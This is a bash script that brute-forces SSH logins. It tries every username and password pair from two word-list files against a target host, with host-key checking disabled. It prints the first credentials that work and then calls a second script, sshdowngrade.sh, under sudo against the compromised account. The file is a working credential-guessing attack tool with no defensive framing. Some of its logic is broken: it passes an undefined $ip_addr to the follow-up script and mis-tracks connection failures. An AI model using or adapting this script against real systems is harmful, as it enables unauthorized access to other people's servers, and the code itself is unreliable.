#!/bin/bash

# IP address of the SSH server
SSH_HOST=$1

# File containing usernames
USER_FILE="user.txt"

# File containing passwords
PASS_FILE="pass.txt"
# echo $SSH_HOST
i=0
connection_issue=1
# Loop through each combination of usernames and passwords
while IFS= read -r username || [ -n "$username" ]; do
    while IFS= read -r password || [ -n "$password" ]; do
        # echo $username $password
        i=$((i+1))
        # Attempt to connect using the current combination of username and password
        sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$SSH_HOST "exit 0"> /dev/null 2>&1

        exitStatus=$?
        # echo $exitStatus 
        # Check the exit code to determine if the connection was successful
        if [ $exitStatus -eq 0 ]; then
            #echo "Access granted - Username: $username, Password: $password"
            echo "Username = "$username" and Password = "$password" Attempt = "$i
            
            
            
            echo "#****************SSH Downgrade*****************"
	        sudo bash sshdowngrade.sh $ip_addr $username
            
            
            exit 0  # Exit if access is granted
        fi
        if [ $connection_issue -ne 255 ]; then
            connection_issue=0
        fi
    done < "$PASS_FILE"
done < "$USER_FILE"

if [ $connection_issue -eq 1 ]; then
    echo "Connection Failure"
else
    echo "No Success"
fi
exit 1

